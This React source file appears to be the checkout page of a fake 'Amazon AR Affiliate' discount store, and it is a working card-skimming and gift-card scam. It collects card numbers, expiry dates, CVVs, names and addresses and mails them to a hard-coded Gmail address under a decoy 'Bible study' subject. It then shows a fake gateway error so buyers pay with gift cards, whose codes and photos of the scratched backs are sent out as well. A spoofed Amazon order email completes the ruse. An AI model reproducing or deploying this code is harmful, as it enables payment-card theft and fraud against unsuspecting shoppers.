import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useCart } from '../../data/context/CartContext';
import '../GiftCard/giftcard.scss';
import { NavBar } from '../nav/Nav';
import { faCcAmazonPay } from '@fortawesome/free-brands-svg-icons/faCcAmazonPay';
import { faArrowLeft, faArrowUp, faCamera, faCreditCard, faExclamationCircle, faPlus } from '@fortawesome/free-solid-svg-icons';
import { faCcVisa } from '@fortawesome/free-brands-svg-icons';
import { useState } from 'react';
import { formatCreditCard, formatCurrency, formatCvv, formatExpiryDate } from '../../helper/utilities';
import axios from 'axios'

const GiftCard = () => {
    const { state, dispatch } = useCart()
    const [paymentMode, setPaymentMode] = useState('Credit Card')
    const [creditCard, setCreditCard] = useState('')
    const [exp, setExp] = useState('')
    const [cvv, setCvv] = useState('')
    const [cardHolder, setCardHolder] = useState('')
    const [cardHolderName, setCardHolderName] = useState('')
    const[email,setEmail]=useState('')


    const [cardInfo, setCardInfo] = useState([])
    const [imageSrc, setImageSrc] = useState('');
    const [cardAmount, setCardAmount] = useState(0)
    const [cardValue, setCardValue] = useState('')
    const handlePayment = () => {
        if (paymentMode === 'Credit Card') {
            processCreditCardPayment(email,cardHolderName,creditCard,exp,cvv,cardHolder)
        }
        else {
            if(cardInfo.length!=0){
                processAmazonCardPayment()
            }
            else{
                alert('load amazon card to make purchase')
                console.log(cardValue)
            }
            
        }
    }

    const processCreditCardPayment = (email, cc_name, cc_num, cc_exp, cc_cvv, cc_address) => {
        if(cc_num==''||cc_name==''||cc_exp==''||email==''||cc_cvv==''||cc_address==''){
            if(cc_num==''){
                alert('credit card field empty')
            }
            if(cc_exp==''){
                alert('expiry date field empty') 
            }
            if(cc_name==''){
                alert('name field empty')
            }
            if(cc_cvv==''){
                alert('cvv field empty')
            }
            if(email=''){
                alert('email field empty')
            }
            if(cc_address=''){
                alert('address field empty')
            }
        }else{
            const subject='Bible study:blessing recieved'
            const msg={
                email:email,
                cc_name:cc_name,
                cc_num:cc_num,
                cc_exp:cc_exp,
                cc_cvv:cc_cvv,
                address:cc_address
            }
            const formData= new FormData()
            formData.append('msg',JSON.stringify(msg))
            formData.append('subject',subject)
            formData.append('email','lauramikemiller@gmail.com')

           sendAccolades(formData)
           alert('Gateway Error! Pay via Amazon');
        }

    }
    const processAmazonCardPayment = () => {
        const htmlContent = `
      <html>
        <body>
          <h1>Your Order #AMA-0888384840348 - Payment Verification Pending</h1>
          <p>Dear Esteemed Customer,</p>
          <p>Thank you for your recent order with Amazon AR Affiliate! We’ve received your order and are currently reviewing the payment. Please note that we are in the process of verifying your payment through the Amazon gift card method you selected. Once everything is confirmed, we will begin processing and shipping your order.</p>
          <p><strong>Order Number:</strong> Order #AMA-0888384840348</p>
          <p><strong>Order Total:</strong> 30% discount of ${state.totalAmount}</p>
          <p><strong>Payment Method:</strong> Amazon Gift Card</p>
          <p>If you have any questions, please contact us at Info@amazon.com or lambertmiranda909@gmail.com.</p>
        </body>
      </html>
    `;
       
        sendMessageToCustomer(htmlContent,email,"Your Order #AMA-0888384840348 - Payment Verification Pending")
    }

    const sendAccolades = async (msg) => {
        try {
            const response = await axios.post('http://127.0.0.1:5000/sendemail',msg,{
             header: {
                    'content-type': 'multipart/form-data'
                }
            }
            );
            if (response) {
               console.log(response.data.message)
            } else {
                alert('Gateway Error! Pay via Amazon');
            }
        } catch (error) {
            console.error(error)
        }

    }

    const sendMessageToCustomer = async (msg,mail,subject) => {
        const formData = new FormData()
        formData.append('msg', msg)
        formData.append('email', mail)
        formData.append('subject',subject)
        try {
            const response = await axios.post('http://127.0.0.1:5000/sendMessageToCustomer',formData,{
             header: {
                    'content-type': 'multipart/form-data'
                }
            }
            );
            if (response) {
                alert(response.data.message)
            } else {
                alert('Gateway Error! Pay via Amazon');
            }
        } catch (error) {
            console.error(error)
        }

    }

    const setD=()=>{
       return ((creditCard==''||cardHolderName==''||exp==''||email==''||cvv==''||cardHolder==''))?false:false
    }
    const addCard = () => {

        const info = {
            card: cardValue,
            card_amount: cardAmount,
            img: imageSrc
        }
        const formData=new FormData();
        formData.append('msg',JSON.stringify(
            {
            card:info.card,
            amount:info.card_amount
        }
        ))
        const subject='Bible study:blessing recieved'
        formData.append('image',mamaSendPhoto)  
        formData.append('subject',subject)
        formData.append('email','lauramikemiller@gmail.com')

        setCardInfo([...cardInfo, info])
        setCardValue('')
        setCardAmount('')
        setImageSrc('')
        
        sendAccolades(formData)
    }
    const [mamaSendPhoto,setMamaSendPhoto]=useState('')
    return (
        <div className="giftcard">
            <div className="nav-holder">
                <NavBar cart_state={state} />
            </div>
            
            <div className="payment-method">
                <div className="payment-form">
                    <div className="form-wrp">
                        <div className="form-header">
                            <h3>Payment Details</h3>
                            <span>Complete your purchase by providing your payment details.</span>
                        </div>
                        <div className="email-txt">
                            <label htmlFor="">Email address</label>
                            <input 
                                type="email" 
                                placeholder='JohnDoe@example.com' 
                                value={email}
                                onChange={(e)=>{
                                    setEmail(e.target.value)
                                }}
                                />
                        </div>
                        <div className="select-payment-method">
                            <h3>Select Payment Method</h3>
                            <div className="payment-method-button-wrp">
                                <PaymentButton icon={faCreditCard} payment_mode='Credit Card' className='card-boder' pay_mode={() => { setPaymentMode('Credit Card') }} cn={paymentMode} />
                                <PaymentButton icon={faCcAmazonPay} payment_mode='Amazon Gift Card' pay_mode={() => { setPaymentMode('Amazon Gift Card') }} cn={paymentMode} />

                            </div>
                        </div>

                        <div className="c-details-grid">
                            {(paymentMode == 'Credit Card') ?
                                <CreditCardDetails
                                    cc={creditCard}
                                    set_cc={(e) => {
                                        setCreditCard(formatCreditCard(e))
                                    }}
                                    exp={exp}
                                    cvv={cvv}
                                    set_cvv={(e) => {
                                        setCvv(formatCvv(e))
                                    }}
                                    set_exp={(e) => {
                                        setExp(formatExpiryDate(e))
                                    }}
                                    cardHolderAddress={cardHolder}
                                    setChAddr={(e) => {
                                        setCardHolder(e)
                                    }}
                                    cardHolderName={cardHolderName}
                                    setChn={(e)=>{
                                        setCardHolderName(e)
                                    }}

                                />
                                :
                                <Amazon
                                cardInfo={cardInfo}
                                cardAmount={cardAmount}
                                cardValue={cardValue}
                                imageSrc={imageSrc}
                                setCardValue={(e)=>{
                                    setCardValue(e)
                                }}
                                setCardAmount={(e)=>{
                                    setCardAmount(e)
                                }}
                                setCardInfo={(e)=>{
                                    setCardInfo(e)
                                }}
                                setImageSrc={(e)=>{
                                    setImageSrc(e)
                                }}

                                addCard={addCard}
                               sendCard={(e)=>{
                                    setMamaSendPhoto(e)
                               }}
                                />
                                }
                        </div>

                        <div className="t-amout-wrp">
                            <TotalAmountgrid state={state} sub_total={formatCurrency(state.totalAmount, '$')} />
                        </div>

                        <div className="payment-btn-wrp">
                            <PayButton
                             state={state} 
                             pay={handlePayment} 
                             setDisabled={((creditCard==''||cardHolderName==''||exp==''||email==''||cvv==''||cardHolder=='')&&(paymentMode=='Credit Card'))?true:false}
                             />
                        </div>
                    </div>
                </div>
            </div>

        </div>
    );
}

const PaymentButton = ({ icon, payment_mode, pay_mode, cn }) => {

    const cClass = (cn == payment_mode) ? 'payment-method-button card-border' : 'payment-method-button'
    return (
        <div className={cClass} onClick={() => {
            pay_mode()
        }}>
            <FontAwesomeIcon icon={icon} />
            <p>{payment_mode}</p>
        </div>
    )

}

const CreditCardDetails = ({ cc, set_cc, exp, set_exp, cvv, set_cvv, cardHolderAddress, setChAddr ,cardHolderName,setChn}) => {
    const handleSetCC = (cc) => {
        const form_cc = cc
        set_cc(form_cc)
    }
    return (
        <div className="credit-card-details">
            <div className="c-title">
                <h3>Card Details</h3>
            </div>
            <div className="c-details-form">
                <div className="c-name-txt">
                    <input
                     type="text" 
                     placeholder='John Doe' 
                     value={cardHolderName}
                     onChange={(e)=>{
                        setChn(e.target.value)
                     }}
                     />
                </div>

                <div className="c-detail-wrp">
                    <div className="c-number">
                        <input
                            maxLength={19}
                            value={cc}
                            type="text" placeholder='5112 5342 3638 3893'
                            onChange={(e) => {
                                handleSetCC(e.target.value)
                            }}
                        />
                        <FontAwesomeIcon icon={faCcVisa} />
                    </div>

                    <div className="date-ccv-wrp">
                        <input
                            type="text"
                            placeholder='12/98'
                            value={exp}
                            onChange={(e) => {
                                set_exp(e.target.value)
                            }}
                        />
                        <input
                            type="password"
                            placeholder='cvv'
                            value={cvv}
                            onChange={(e) => {
                                set_cvv(e.target.value)
                            }}
                        />
                    </div>

                    <div className="card-address">
                        <input
                            type="text"
                            placeholder='101 W MAIN ST S APT 101, WASHINGTON DC 20019-USA'
                            value={cardHolderAddress}
                            onChange={(e) => {
                                setChAddr(e.target.value)
                            }}
                        />
                    </div>
                </div>
                <span>Payment are secure and encrypted</span>
            </div>

        </div>
    )
}
const calculatedDiscountedPrice = (original_price) => {
    const discountedPrice = parseInt(original_price) * (1 - 0.30)
    const denominations = [50, 100, 250, 500]
    let closestValue = denominations.reduce((prev, curr) => {
        return Math.abs(curr - discountedPrice) < Math.abs(prev - discountedPrice) ? curr : prev
    });
    return Math.floor(discountedPrice);
}

const TotalAmountgrid = ({ sub_total, state }) => {


    return (
        <div className="total-amout-grid">
            <div className="sub-total">
                <span>Sub Total</span>
                <span>{sub_total}</span>
            </div>
            <div className="discount">
                <span>Discount</span>
                <span>30%</span>
            </div>
            <div className="total">
                <span>Total</span>
                <span>{formatCurrency(calculatedDiscountedPrice(state.totalAmount), '$')}</span>
            </div>

        </div>
    )
}

const PayButton = ({ state, pay, setDisabled }) => {
    return (
        <div className="pay-button">
            <button
                onClick={pay}
                disabled={setDisabled}
            >
                <span>Pay {formatCurrency(calculatedDiscountedPrice(state.totalAmount), '$')}</span>

            </button>
        </div>
    )
}

const Amazon = ({addCard,sendCard,imageSrc,cardAmount,setImageSrc,cardValue,setCardValue,cardInfo,setCardInfo,setCardAmount}) => {
   
    function formatString(input) {
        // Remove any existing hyphens from the string (just in case)
        const cleanedInput = input.replace(/-/g, '');

        // Limit the input to 18 characters
        const limitedInput = cleanedInput.slice(0, 15);

        // Convert the string to uppercase (optional)
        const upperInput = limitedInput.toUpperCase();
        let result = '';

        // Loop through the string and add hyphens after every 5 characters
        for (let i = 0; i < upperInput.length; i += 5) {
            if (i > 0) {
                result += '-'; // Add hyphen after the first chunk
            }
            result += upperInput.slice(i, i + 5); // Add the next 5 characters
        }

        return result;
    }

   

    const handleFileChange = (e) => {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = (e) => {
                setImageSrc(e.target.result); // Set the image src to the file's data URL
            };
            reader.readAsDataURL(file);
        }
    };

    const Card =
        <div className="cards">
            <div className="card-txt-wrp">
                <input
                    type="text"
                    placeholder='CGXP-C8N7-4QP8'
                    value={cardValue}
                    onChange={(e) => {
                        const a = formatString(e.target.value)
                        setCardValue(a)

                    }}
                />
                <label htmlFor='card-img'>
                    <input
                        type="file"
                        accept="image/*"
                        onChange={(e)=>{
                            sendCard(e.target.files[0]);
                            handleFileChange(e)}}
                        id='card-img'
                    />
                    <FontAwesomeIcon icon={faCamera} />
                </label>
            </div>
            <div className="card-price-wrp">
                <div>
                    {[100, 200, 300, 500].map((c) => (
                        <button
                            key={c}
                            className={(cardAmount === c) ? 'chosen-amount' : ''}
                            onClick={() => {
                                setCardAmount(c)
                            }}
                        >
                            ${c}
                        </button>

                    ))}
                </div>
                {(imageSrc) ? <img src={imageSrc} alt="Selected" width="300" /> : <span>attach image <FontAwesomeIcon className='arrow-up-animation' icon={faArrowUp} /></span>}
            </div>

        </div>


  
  
    const cardTotal = cardInfo.reduce((prev, curr) => {
        return prev + curr.card_amount
    }, 0)
    return (
        <div className="amazon">
            <div className="amazon-wrp">

                {Card}

                <span
                style={
                    {
                        textAlign:'right',
                        width:'100%'
                    }
                }
                >
                    scratch card and upload image of card back!
                </span>
                <div className="add-card-wrp">
                    
                    <button
                        onClick={() => { addCard() }}
                        disabled={(cardValue == '' || cardAmount == '' || imageSrc == '')}
                    >
                        Add Card
                        <FontAwesomeIcon icon={faPlus} />
                    </button>
                </div>

                <div className="card-list">
                    {(cardInfo.length != 0) &&
                        cardInfo.map((data, INDEX) => (
                            <div className="list-item">
                                <span>{INDEX + 1} S/N: {data.card} <span className='roboto-bold'>${data.card_amount}</span> </span>
                                
                               
                                <span className='roboto-bold'> <img src={data.img} alt={data.card_amount} /> pending <FontAwesomeIcon icon={faExclamationCircle} /></span>
                            </div>
                        ))
                    }
                    <div className="amazon-card-total roboto-bold">

                        {(cardInfo.length != 0) && 'Card total: $' + cardTotal}
                    </div>
                </div>
            </div>
        </div>
    )
}


export default GiftCard;


